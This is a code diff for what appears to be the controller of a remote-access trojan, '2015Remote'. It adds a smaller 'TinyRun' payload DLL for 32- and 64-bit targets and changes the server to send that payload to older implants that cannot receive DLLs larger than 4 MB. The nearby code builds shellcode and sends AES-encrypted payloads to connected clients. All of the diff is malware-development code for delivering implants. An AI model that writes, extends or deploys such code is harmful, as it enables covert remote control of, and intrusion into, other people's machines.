@@ -489,6 +489,7 @@ CMy2015RemoteDlg::~CMy2015RemoteDlg()
     for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
         SAFE_DELETE(m_ServerDLL[i]);
         SAFE_DELETE(m_ServerBin[i]);
+        SAFE_DELETE(m_TinyRun[i]);
     }
     for (int i = 0; i < m_DllList.size(); i++) {
         SAFE_DELETE(m_DllList[i]);
@@ -1086,13 +1087,14 @@ bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuff
     return false;
 }
 
-Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="")
+Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="", bool isTiny=false)
 {
     BYTE* szBuffer = NULL;
     int dwFileSize = 0;
 
     // 查找名为 MY_BINARY_FILE 的 BINARY 类型资源
-    auto id = is64Bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86;
+    auto id = !isTiny ? (is64Bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86) : 
+        (is64Bit ? IDR_TINYRUN_X64 : IDR_TINYRUN_X86);
     HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCE(id), "BINARY");
     if (hResource == NULL) {
         return NULL;
@@ -1407,6 +1409,12 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 
     UPDATE_SPLASH(65, "正在加载内核模块 (x64 Bin)...");
     m_ServerBin[PAYLOAD_DLL_X64] = ReadKernelDll(true, false, master);
+
+    UPDATE_SPLASH(67, "正在加载内核模块 (x86 TinyRun)...");
+    m_TinyRun[PAYLOAD_DLL_X86] = ReadKernelDll(false, true, master, true);
+
+    UPDATE_SPLASH(69, "正在加载内核模块 (x64 TinyRun)...");
+    m_TinyRun[PAYLOAD_DLL_X64] = ReadKernelDll(true, true, master, true);
 
     // 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
     //  执行此操作
@@ -4498,6 +4506,13 @@ BOOL CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, 
     auto id = is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86;
     auto buf = isDLL ? m_ServerDLL[id] : m_ServerBin[id];
     if (buf->length()) {
+        // 检查旧客户端是否能接收大 DLL (旧 test.cpp 客户端 bufSize=4MB)
+        // 注：SHELLCODE 请求来自 main.c，一直是 8MB，不需要检查
+        const size_t OLD_CLIENT_MAX_SIZE = 4 * 1024 * 1024;
+        if (isDLL && buf->length() > OLD_CLIENT_MAX_SIZE) {
+            Mprintf("[SendServerDll] DLL size %.2f MB: use TinyRunDLL instead.\n", buf->length()/1024.);
+			buf = is64Bit ? m_TinyRun[PAYLOAD_DLL_X64] : m_TinyRun[PAYLOAD_DLL_X86];
+        }
         // 只有发送了IV的加载器才支持AES加密
         int len = ContextObject->InDeCompressedBuffer.GetBufferLength();
         bool hasIV = len >= 32 && !isAllZeros(ContextObject->InDeCompressedBuffer.GetBuffer(16), 16);
